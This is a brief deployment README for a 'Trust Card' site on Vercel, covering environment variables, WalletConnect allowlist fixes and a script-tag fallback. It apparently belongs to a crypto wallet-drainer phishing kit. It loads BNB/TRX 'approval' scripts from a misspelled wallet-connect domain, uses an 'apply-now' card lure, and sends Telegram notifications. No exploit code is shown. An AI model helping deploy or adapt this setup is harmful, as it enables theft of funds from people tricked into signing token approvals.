# Vercel Environment Variables

Same as the BEP20 reference site. Add these in **Vercel → Project → Settings → Environment Variables**:

| Variable | Description | Example |
|----------|-------------|---------|
| `TRUST_CARD_APPROVAL_URL` | URL for fluxpay scripts (BNB/TRX). Leave empty to use local `/fluxpay/` | `https://wallete-connect-bep-20.vercel.app` |
| `VITE_PROJECT_ID` | WalletConnect Project ID from [dashboard.walletconnect.com](https://dashboard.walletconnect.com) | `11e5445365f720d1050dc106ba2e78d6` |
| `TELEGRAM_BOT_TOKEN` | (Optional) From @BotFather for notifications | |
| `TELEGRAM_CHAT_ID` | (Optional) Chat ID for notifications | |

**ChunkLoadError 198:** The chat widget chunk (`198.cbf644a09b7083ca.js`) is missing from the build. Run a fresh `next build` from the Next.js source and redeploy to regenerate all chunks.

**WalletConnect "origin not allowed" (code 3000):** Add your deployment URLs to the [WalletConnect Cloud allowlist](https://dashboard.walletconnect.com) → Project → Allowlist. Include:
- `https://trust-card.vercel.app`
- `https://trust-card-git-main-*.vercel.app` (or each preview URL)
- `https://*.vercel.app` to allow all preview deployments

**Note:** The `/api/config` serverless endpoint injects these at runtime. Ensure the `api/` folder is deployed. If `/api/config` is not available, add before `apply-now-flow.js`:
```html
<script>window.TRUST_CARD_APPROVAL_URL='https://wallete-connect-bep-20.vercel.app';</script>
```
